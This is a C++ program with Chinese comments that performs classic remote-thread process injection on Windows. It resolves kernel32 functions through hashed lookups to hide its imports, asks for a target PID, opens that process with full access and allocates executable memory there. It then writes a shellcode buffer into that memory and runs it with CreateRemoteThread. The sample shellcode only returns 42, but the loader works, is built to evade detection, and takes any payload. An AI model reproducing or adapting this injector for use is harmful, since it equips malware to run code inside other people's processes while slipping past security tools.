int main() {
    // ① 拿到 kernel32.dll 基址
    HMODULE hKernel32 = (HMODULE)GetModuleAddress(HASH_KERNEL32);
    if (!hKernel32) {
        std::cerr << "[-] 未找到 kernel32.dll" << std::endl;
        return 1;
    }
    std::cout << "[+] kernel32.dll: 0x" << std::hex 
              << (uintptr_t)hKernel32 << std::dec << std::endl;

    // ② 动态解析所有需要的函数地址
    FARPROC pOpenProcess = (FARPROC)GetProcAddressR(hKernel32, HASH_OPENPROCESS);
    FARPROC pVirtualAllocEx = (FARPROC)GetProcAddressR(hKernel32, HASH_VIRTUALALLOCEX);
    FARPROC pWriteProcessMemory = (FARPROC)GetProcAddressR(hKernel32, HASH_WRITEPROCESSMEMORY);
    FARPROC pCreateRemoteThread = (FARPROC)GetProcAddressR(hKernel32, HASH_CREATEREMOTETHREAD);
    FARPROC pWaitForSingleObject = (FARPROC)GetProcAddressR(hKernel32, HASH_WAITFORSINGLEOBJECT);
    FARPROC pCloseHandle = (FARPROC)GetProcAddressR(hKernel32, HASH_CLOSEHANDLE);

    // 检查解析结果
    if (!pOpenProcess || !pVirtualAllocEx || !pWriteProcessMemory ||
        !pCreateRemoteThread || !pWaitForSingleObject || !pCloseHandle) {
        std::cerr << "[-] 函数解析失败" << std::endl;
        return 1;
    }
    std::cout << "[+] 所有函数地址解析成功" << std::endl;

    // ③ 定义函数指针类型（因为不能用 FARPROC 直接调用）
    typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE(WINAPI* fnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef DWORD(WINAPI* fnWaitForSingleObject)(HANDLE, DWORD);
    typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);

    fnOpenProcess  OpenProcess  = (fnOpenProcess)pOpenProcess;
    fnVirtualAllocEx VirtualAllocEx = (fnVirtualAllocEx)pVirtualAllocEx;
    fnWriteProcessMemory WriteProcessMemory = (fnWriteProcessMemory)pWriteProcessMemory;
    fnCreateRemoteThread CreateRemoteThread = (fnCreateRemoteThread)pCreateRemoteThread;
    fnWaitForSingleObject WaitForSingleObject = (fnWaitForSingleObject)pWaitForSingleObject;
    fnCloseHandle CloseHandle = (fnCloseHandle)pCloseHandle;

    // ④ 获取目标进程 PID
    DWORD pid = 0;
    std::cout << "请输入目标进程 PID: ";
    std::cin >> pid;

    // ⑤ 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败，错误码: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] 已打开目标进程，句柄: 0x" << std::hex 
              << (uintptr_t)hProcess << std::dec << std::endl;

    // ⑥ Shellcode
    unsigned char shellcode[] = {
        0xB8, 0x2A, 0x00, 0x00, 0x00,   // mov eax, 42
        0xC3                             // ret
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    // ⑦ 在目标进程申请内存
    LPVOID pRemoteMem = VirtualAllocEx(
        hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        std::cerr << "[-] VirtualAllocEx 失败" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] 远程内存地址: 0x" << std::hex 
              << (uintptr_t)pRemoteMem << std::dec << std::endl;

    // ⑧ 写入 Shellcode
    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Shellcode 写入成功" << std::endl;

    // ⑨ 创建远程线程执行 Shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemoteMem,
        NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread 失败" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] 远程线程创建成功，等待执行..." << std::endl;

    // ⑩ 等待线程结束，清理资源
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "[+] 注入完成" << std::endl;
    system("pause");
    return 0;
}